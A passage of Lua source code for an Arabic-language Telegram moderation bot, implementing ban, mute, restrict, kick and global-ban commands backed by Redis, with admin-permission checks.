if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(darket.."ktmAll:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."ktmAll:Groups",Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
end
end
if text == ('حظر') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if Redis:sismember(darket.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم حظره من الكروب ").Reply,"md",true)  
end
end
if text == ('الغاء حظر') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(darket.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء حظره من الكروب  ").Reply,"md",true)  
end
end

if text == ('كتم') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusSilent(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
if Redis:sismember(darket.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم كتمه في الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم كتمه في الكروب  ").Reply,"md",true)  
end
end
if text == ('الغاء كتم') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Redis:sismember(darket.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء كتمه من الكروب ").Reply,"md",true)  
else
Redis:srem(darket.."SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء كتمه من الكروب ").Reply,"md",true)  
end
end

if text == ('تقييد') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تقييده في الكروب ").Reply,"md",true)  
end

if text == ('الغاء التقييد') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم الغاء تقييده من الكروب").Reply,"md",true)  
end

if text == ('طرد') and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم طرده من الكروب ").Reply,"md",true)  
end

if text and text:match('^حظر عام (%d+)$') then
local UserId = text:match('^حظر عام (%d+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
end
if UserId == "5386549632" then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على المبرمج ستيفن *","md",true)  
end
if UserId == "5386549632" then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على مطور السورس*","md",true)  
end
if Redis:sismember(darket.."BanAll:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."BanAll:Groups",UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم حظره عام من المجموعات ").Reply,"md",true)  
end
end
if text and text:match('^الغاء العام (%d+)$') then
local UserId = text:match('^الغاء العام (%d+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(darket.."BanAll:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."BanAll:Groups",UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
end
end
if text and text:match('^كتم عام (%d+)$') then
local UserId = text:match('^كتم عام (%d+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if UserId == "5386549632" then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على المبرمج ستيفن *","md",true)  
end
if UserId == "5386549632" then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على مطور السورس *","md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
end
if Redis:sismember(darket.."ktmAll:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."ktmAll:Groups",UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم كتمه عام من المجموعات ").Reply,"md",true)  
end
end
if text then
if text:match('^الغاء كتم العام (%d+)$') or text:match('^الغاء كتم عام (%d+)$') then
local UserId = text:match('^الغاء كتم العام (%d+)$') or text:match('^الغاء كتم عام (%d+)$')
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end

local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(darket.."ktmAll:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."ktmAll:Groups",UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
end
end
end 
if text then
if text:match('^حظر (%d+)$') then
local UserId = text:match('^حظر (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
end
if Redis:sismember(darket.."BanGroup:Group"..msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."BanGroup:Group"..msg_chat_id,UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم حظره من الكروب ").Reply,"md",true)  
end
end
end
if text then
if text:match('^الغاء حظر (%d+)$') then
local UserId = text:match('^الغاء حظر (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(darket.."BanGroup:Group"..msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."BanGroup:Group"..msg_chat_id,UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء حظره من الكروب  ").Reply,"md",true)  
end
end

if text and text:match('^كتم (%d+)$') then
local UserId = text:match('^كتم (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusSilent(msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
end
if Redis:sismember(darket.."SilentGroup:Group"..msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم كتمه في الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."SilentGroup:Group"..msg_chat_id,UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم كتمه في الكروب  ").Reply,"md",true)  
end
end
if text and text:match('^الغاء كتم (%d+)$') then
local UserId = text:match('^الغاء كتم (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(darket.."SilentGroup:Group"..msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء كتمه من الكروب ").Reply,"md",true)  
else
Redis:srem(darket.."SilentGroup:Group"..msg_chat_id,UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء كتمه من الكروب ").Reply,"md",true)  
end
end

if text and text:match('^تقييد (%d+)$') then
local UserId = text:match('^تقييد (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,0,0,0,0,0,0,0,0})
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم تقييده في الكروب ").Reply,"md",true)  
end

if text and text:match('^الغاء التقييد (%d+)$') then
local UserId = text:match('^الغاء التقييد (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم الغاء تقييده من الكروب").Reply,"md",true)  
end

if text and text:match('^طرد (%d+)$') then
local UserId = text:match('^طرد (%d+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(darket.."Status:BanId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم طرده من الكروب ").Reply,"md",true)  
end
end
if text == "نزلني" then
if not Redis:get(darket.."Status:remMe"..msg_chat_id) then
